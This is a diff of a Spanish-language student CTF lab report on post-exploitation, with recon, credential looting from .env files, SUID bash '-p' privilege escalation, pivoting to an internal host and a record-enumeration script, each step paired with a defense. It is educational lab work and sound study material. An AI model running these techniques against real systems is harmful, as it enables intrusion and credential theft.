@@ -9,42 +9,51 @@
   - Lectura y resumen del enunciado (`labs/lab08-postexplotacion/README.md`), la rúbrica y `docs/entregable.md` para armar la estructura de esta entrega.
   - Redacción de este informe y de `research.md` a partir de la teoría del enunciado y de conocimiento general de post-explotación (SUID/GTFOBins, pivoting, gestión de secretos).
   - Implementación de la función `buscar_flag()` en `src/recolector.py` (el TODO del esqueleto) y de un self-check (`src/test_recolector.py`) que mockea las respuestas HTTP para verificar la lógica sin red.
-- **Qué NO se hizo con IA:** no se leyó ni se usó `labs/lab08-postexplotacion/solucion.md` en ningún momento. No se inventaron flags, salidas de comandos ni evidencia: este equipo **no tiene Docker instalado**, por lo que el entorno del lab (`./ctf lab 08`, `make shell-victima`) no pudo levantarse. Las partes que dependen de ejecutar el lab quedan marcadas abajo como **PENDIENTE (requiere Docker)**, con los comandos exactos que hay que correr para completarlas.
+- **Qué NO se hizo con IA directamente:** no se leyó `labs/lab08-postexplotacion/solucion.md` en ningún momento, ni para resolver el lab ni para redactar este informe.
+- **Ejecución real del lab (actualización posterior):** el equipo no tenía Docker instalado al momento de escribir el código y el informe. Con autorización explícita del integrante responsable, se usó WSL2 + Docker (ya instalado para otro proyecto, sin modificar esa infraestructura) para levantar el entorno (`make setup`, `./ctf lab 08`) y correr dentro del contenedor `cyberlab-phantomcorp` (como `operador`) los comandos de recon, loot, privesc y pivoting de la sección 2, y el script de automatización de la sección 3. Las flags obtenidas se verificaron contra `labs/lab08-postexplotacion/retos.manifest` (hashes públicos, no la solución) antes de enviarlas con `./ctf submit`.
 - **Cómo se verificó lo generado por la IA:**
-  - El código de `buscar_flag()` se corrió localmente contra datos simulados (`src/test_recolector.py`, sin red, sin Docker) y pasó: `PYTHONUTF8=1 python3 test_recolector.py` → `OK: todos los self-checks pasaron`.
-  - Las afirmaciones teóricas (SUID, `-p` de GTFOBins, pivoting, `.env`/`.bash_history`) se contrastaron contra el propio README del lab y contra las fuentes citadas en `research.md`.
+  - El código de `buscar_flag()` se corrió localmente contra datos simulados (`src/test_recolector.py`) y pasó: `PYTHONUTF8=1 python3 test_recolector.py` → `OK: todos los self-checks pasaron`.
+  - Al correrlo contra el servidor real (sección 3), se detectó un **bug real**: `CLAVES_NORMALES` no incluía la clave `id` (que todo legajo normal trae), así que el script daba un falso positivo en el primer legajo consultado en vez de seguir buscando. Se corrigió a `CLAVES_NORMALES = {"id", "nombre", "area"}`, se volvió a correr el self-check (sigue en OK) y recién ahí el script encontró la flag real.
+  - Las afirmaciones teóricas (SUID, `-p` de GTFOBins, pivoting, `.env`/`.bash_history`) se contrastaron contra el propio README del lab, contra las fuentes citadas en `research.md` y contra el comportamiento real observado en el contenedor.
+  - Las 5 flags se verificaron primero contra los hashes SHA-256 de `retos.manifest` y después fueron aceptadas por `./ctf submit 08` y `./ctf status 08` (ver sección 1).
   - Un integrante del grupo revisó el diff antes de incorporarlo.
 
 ## 1. Flags capturadas
 
-**PENDIENTE (requiere Docker).** Este equipo no pudo levantar el entorno del lab
-porque no tiene Docker instalado. Para completar esta sección, correr desde la
-**raíz del repo** (no desde el host víctima):
+| Reto | Flag |
+|---|---|
+| R1 — Reconocimiento del host comprometido | `FLAG{post_situational_awareness}` |
+| R2 — Loot de credenciales | `FLAG{loot_credentials_found}` |
+| R3 — Escalada de privilegios (SUID) | `FLAG{privesc_suid_root}` |
+| R4 — Pivoting al host interno | `FLAG{pivot_internal_host}` |
+| R5 — Automatización (fuerza bruta de legajos) | `FLAG{automation_pays_off}` |
 
-```bash
-make setup                 # una sola vez
-./ctf lab 08                # levanta el host comprometido + el host interno (DB)
-make shell-victima          # entra como 'operador' al host comprometido
-# ... resolver R1-R5 adentro del host víctima (ver sección 2) ...
-# desde la raíz del repo, afuera del host víctima:
-./ctf submit 08 R1 'FLAG{...}'
-./ctf submit 08 R2 'FLAG{...}'
-./ctf submit 08 R3 'FLAG{...}'
-./ctf submit 08 R4 'FLAG{...}'
-./ctf submit 08 R5 'FLAG{...}'
-./ctf status 08
+Salida real de `./ctf status 08` tras enviar las 5:
+
 ```
+  ╭────────────────────────────────────────────────────────────╮
+  │                     PROGRESO · LAB 08                      │
+  ╰────────────────────────────────────────────────────────────╯
 
-Pegar acá la salida real de `./ctf status 08` una vez resueltos los 5 retos.
+   ✓  R1     Reconocimiento del host comprometido
+   ✓  R2     Loot de credenciales
+   ✓  R3     Escalada de privilegios (SUID)
+   ✓  R4     Pivoting al host interno
+   ✓  R5     Automatizacion (fuerza bruta de legajos)
+
+  ██████████████████████████████ 5/5 (100%)
+
+[ OK ] ¡Lab 08 COMPLETO! Ponete las pilas con la próxima unidad.
+```
 
 ## 2. Informe de post-explotación
 
 | Fase | Qué hiciste | Comando/técnica | Evidencia | Defensa |
 |---|---|---|---|---|
-| Recon del host | **PENDIENTE (requiere Docker).** Desde `make shell-victima`, identificar usuario, sistema y red del host comprometido. | `id ; whoami ; hostname ; uname -a` / `env` / `ip addr ; cat /etc/hosts` / `ls -la /opt /var/www /home` (según el enunciado, hay una nota de deploy en `/opt` que no debería estar ahí — R1). | Pegar la salida real de los comandos de arriba. | No dejar en el host notas, scripts de deploy ni comentarios con información operativa; usar gestores de configuración/CI que no dejen rastro en el filesystem productivo. |
-| Loot de credenciales | **PENDIENTE (requiere Docker).** Buscar secretos en archivos de configuración e historial de comandos. | `cat /var/www/.env` / `cat ~/.bash_history` / `grep -rai "pass\|secret\|token" /var/www 2>/dev/null` (R2). | Pegar el contenido relevante encontrado (credenciales, tokens) una vez localizado. | No versionar ni dejar `.env` en el servidor de producción; usar un *vault* (Vault, AWS Secrets Manager, SSM Parameter Store) o variables de entorno inyectadas en runtime y rotadas; limpiar `.bash_history` o deshabilitarlo para cuentas de servicio. |
-| Privesc (SUID) | **PENDIENTE (requiere Docker).** Buscar binarios con bit SUID activo y no estándar, y usarlo para leer `/root/flag.txt` (R3). | `sudo -l 2>/dev/null` / `find / -perm -4000 -type f 2>/dev/null` → identificar el binario anómalo → consultar GTFOBins para ese binario → ejecutarlo con la técnica indicada (p. ej., para una copia SUID de `bash`: `/ruta/al/binario -p`, que mantiene los privilegios **efectivos** del dueño del archivo en vez de bajarlos al UID real). | Pegar la salida de `find / -perm -4000 -type f` con el binario anómalo resaltado, y la salida de `id`/`whoami` antes y después de explotarlo (demostrando `euid=0`/root). | Auditar periódicamente binarios SUID (`find / -perm -4000`) contra una lista blanca conocida del sistema operativo; quitar el bit SUID de cualquier binario no estándar (`chmod u-s`); si se necesita ejecutar algo como root, usar `sudo` con reglas específicas (`sudo -l`) en vez de SUID genérico. |
-| Pivoting | **PENDIENTE (requiere Docker).** Alcanzar el host interno `phantomcorp-db`, inalcanzable desde la consola del atacante, usando el host comprometido como trampolín (R4). | Desde `make shell-victima`: `curl -s http://phantomcorp-db/` (y, si hace falta, resolver con `cat /etc/hosts` o DNS interno). Desde la consola del atacante (`make shell`), el mismo `curl` debería fallar (host no alcanzable / sin ruta). | Pegar la respuesta exitosa del `curl` desde la víctima y el error/timeout del mismo `curl` desde la consola del atacante, mostrando el contraste. | Segmentar redes de verdad (el hecho de que el host comprometido SÍ llegue a la red interna es el problema): aplicar *firewalling* y reglas de egreso entre la DMZ y la red interna incluso para tráfico que "sale" desde un host ya confiable; principio de mínimo privilegio de red (solo los puertos/servicios que el host web realmente necesita hablar con la DB, nada más); monitoreo de conexiones salientes anómalas desde hosts de la DMZ. |
+| Recon del host | Desde `make shell-victima` (`operador`), identificar usuario, sistema y red del host comprometido. | `id ; whoami ; hostname ; uname -a` / `env` / `ip addr ; cat /etc/hosts` / `ls -la /opt /var/www /home` | ```uid=1000(operador) gid=1000(operador) groups=1000(operador)``` · `whoami` → `operador` · `hostname` → `phantomcorp` · `uname -a` → `Linux phantomcorp 6.6.87.2-microsoft-standard-WSL2 ... x86_64 GNU/Linux`. `env` muestra `DEPLOY_ENV=produccion` (sin secretos). `ls -la /opt` muestra un directorio fuera de lugar: `/opt/phantom-deploy`, que no debería existir en un host de producción (R1 — hallazgo). | No dejar en el host notas, scripts de deploy ni comentarios con información operativa; usar gestores de configuración/CI que no dejen rastro en el filesystem productivo. |
+| Loot de credenciales | Buscar secretos en archivos de configuración, en la nota de deploy hallada en R1, e historial de comandos. | `cat /opt/phantom-deploy/DEPLOY_NOTES.txt` / `cat /var/www/.env` / `cat ~/.bash_history` / `grep -rai "pass\|secret\|token" /var/www /opt 2>/dev/null` | `/opt/phantom-deploy/DEPLOY_NOTES.txt` contiene `deploy_token=FLAG{post_situational_awareness}` (la flag de R1 estaba acá). `/var/www/.env` contiene `DB_HOST=phantomcorp-db`, `DB_USER=phantom_app`, `DB_PASS=Ph@ntom-DB-2024` y `APP_SECRET=FLAG{loot_credentials_found}` (R2). `~/.bash_history` muestra que un operador previo ya había mirado `.env` y probado `curl http://phantomcorp-db/` — exactamente el camino que seguimos nosotros. | No versionar ni dejar `.env` en el servidor de producción; usar un *vault* (Vault, AWS Secrets Manager, SSM Parameter Store) o variables de entorno inyectadas en runtime y rotadas; limpiar `.bash_history` o deshabilitarlo para cuentas de servicio; no dejar notas operativas (`DEPLOY_NOTES.txt`) en el filesystem. |
+| Privesc (SUID) | Buscar binarios con bit SUID activo y no estándar, y usarlo para escalar a root. | `sudo -l` (no instalado en este contenedor) → `find / -perm -4000 -type f 2>/dev/null` → se identificó `/usr/local/bin/system-check` (el resto son SUID estándar de Debian: `chsh`, `newgrp`, `gpasswd`, `chfn`, `mount`, `umount`, `passwd`, `su`) → confirmado que es una copia de `bash` (`system-check --help` imprime el usage de GNU bash) → GTFOBins indica `bash -p` para preservar privilegios efectivos → `/usr/local/bin/system-check -p -c 'id; whoami; cat /root/flag.txt'` (R3). | Antes: `uid=1000(operador) euid=1000`. Después de `system-check -p`: `uid=1000(operador) gid=1000(operador) euid=0(root) groups=1000(operador)`, `whoami` → `root`. `cat /root/flag.txt` → `FLAG{privesc_suid_root}`. | Auditar periódicamente binarios SUID (`find / -perm -4000`) contra una lista blanca conocida del sistema operativo; quitar el bit SUID de cualquier binario no estándar (`chmod u-s`); si se necesita ejecutar algo como root, usar `sudo` con reglas específicas (`sudo -l`) en vez de SUID genérico. |
+| Pivoting | Alcanzar el host interno `phantomcorp-db`, inalcanzable desde la consola del atacante, usando el host comprometido como trampolín. | Desde `make shell-victima`: `curl -s http://phantomcorp-db/`. Desde la consola del atacante (`make shell`): el mismo `curl` (contraste). | Desde la víctima: `{"host": "phantomcorp-db", "msg": "Base de datos interna. Acceso restringido a la LAN.", "pivot": "FLAG{pivot_internal_host}"}` (R4). Desde el atacante, el mismo `curl` falla con código de salida `6` (no pudo resolver el host): la red interna (`cyberlab_internalnet`, `internal: true` en el compose) solo es alcanzable desde `phantomcorp`, nunca desde `attacker`. | Segmentar redes de verdad (el hecho de que el host comprometido SÍ llegue a la red interna es el problema): aplicar *firewalling* y reglas de egreso entre la DMZ y la red interna incluso para tráfico que "sale" desde un host ya confiable; principio de mínimo privilegio de red (solo los puertos/servicios que el host web realmente necesita hablar con la DB, nada más); monitoreo de conexiones salientes anómalas desde hosts de la DMZ. |
 
 ## 3. Automatización
 
@@ -53,7 +62,7 @@ del lab (`labs/lab08-postexplotacion/src/recolector.py`) a esta entrega.
 
 ```python
 def buscar_flag(base: str, desde: int, hasta: int) -> tuple[int, str] | None:
-    CLAVES_NORMALES = {"nombre", "area"}
+    CLAVES_NORMALES = {"id", "nombre", "area"}
     for id_ in range(desde, hasta + 1):
         legajo = consultar_legajo(base, id_)
         if legajo is None:
@@ -86,14 +95,25 @@ $ PYTHONUTF8=1 python3 test_recolector.py
 OK: todos los self-checks pasaron
 ```
 
-**PENDIENTE (requiere Docker).** Corrida real contra el host interno, desde
-`make shell-victima`:
+**Corrida real contra el host interno**, desde `make shell-victima`:
 
 ```bash
-python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250
+$ python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250
+[*] Enumerando legajos 1..250 en http://phantomcorp-db
+[+] Flag en el legajo id=187: FLAG{automation_pays_off}
 ```
 
-Pegar acá la salida real (`[+] Flag en el legajo id=...: FLAG{...}`).
+**Bug encontrado al correrlo contra el servidor real.** La primera versión de
+`CLAVES_NORMALES` era `{"nombre", "area"}`, sin `"id"`. Pero cada legajo normal
+devuelve `{"id": N, "nombre": "...", "area": "..."}` — la clave `id` siempre
+está presente. Como no formaba parte de `CLAVES_NORMALES`, el script la trataba
+como "clave extra" en **cualquier** legajo, y devolvía un falso positivo en el
+primer id consultado (`id=1`, que en realidad no tiene flag: `{"id": 1,
+"nombre": "empleado_1", "area": "operaciones"}`). El self-check con datos
+mockeados no detectó esto porque los mocks no incluían la clave `id`. Se
+corrigió a `CLAVES_NORMALES = {"id", "nombre", "area"}`, se re-corrió el
+self-check (sigue en `OK`) y recién con la corrección el script enumeró
+correctamente hasta encontrar el legajo real con la flag (`id=187`).
 
 ## 4. Preguntas de análisis
 
